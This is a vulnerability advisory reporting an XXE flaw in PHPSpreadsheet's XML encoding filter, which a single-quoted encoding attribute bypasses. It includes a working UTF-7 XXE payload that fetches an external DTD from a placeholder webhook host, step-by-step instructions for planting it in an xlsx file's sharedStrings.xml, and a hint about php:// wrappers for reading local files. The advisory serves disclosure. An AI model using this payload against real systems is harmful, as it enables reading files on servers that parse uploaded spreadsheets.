summary: "XXE in PHPSpreadsheet encoding is returned\n### Summary\nBypassing the filter allows\
  \ a XXE-attack. Which is turn allows attacker to obtain contents of local files, even if error\
  \ reporting muted by @ symbol. (LFI-attack) \n\n### Details\nCheck ` $pattern = '/encoding=\"\
  (.*?)\"/';` easy to bypass. Just use a single quote symbol `'`. So payload looks like this:\n\
  ```\n<?xml version=\"1.0\" encoding='UTF-7' standalone=\"yes\"?>\n+ADw-!DOCTYPE xxe [+ADw-!ENTITY\
  \ % xxe SYSTEM \"http://example.com/file.dtd\"> %xxe;]>\n```\nIf you add this header to any\
  \ XML file into xlsx-formatted file, such as sharedStrings.xml file, then xxe will execute.\
  \ \n\n### PoC\n1) Create simple xlsx file\n2) Rename xlsx to zip\n3) Go to the zip and open\
  \ the `xl/sharedStrings.xml` file in edit mode.\n4) Replace `<?xml version=\"1.0\" encoding=\"\
  UTF-8\" standalone=\"yes\"?>` to \n```\n<?xml version=\"1.0\" encoding='UTF-7' standalone=\"\
  yes\"?>\n+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM \"http://%webhook%/file.dtd\"> %xxe;]>\n\
  ```\n5) Save `sharedStrings.xml` file and rename zip back to xlsx.\n6) Use minimal php code\
  \ that simply opens this xlsx file:\n```\nuse PhpOffice\\PhpSpreadsheet\\IOFactory;\nrequire\
  \ __DIR__ . '/vendor/autoload.php';\n$spreadsheet = IOFactory::load(\"file.xlsx\");\n```\n\
  7) You will receive the request to your `http://%webhook%/file.dtd`\n8) Dont't forget that\
  \ you can use php-wrappers into xxe, some php:// wrapper payload allows fetch local files.\n\
  \n### Impact\nRead local files\n![lfi](https://github.com/PHPOffice/PhpSpreadsheet/assets/95242087/1839cddb-6bb0-486d-8884-9ac485776931)"
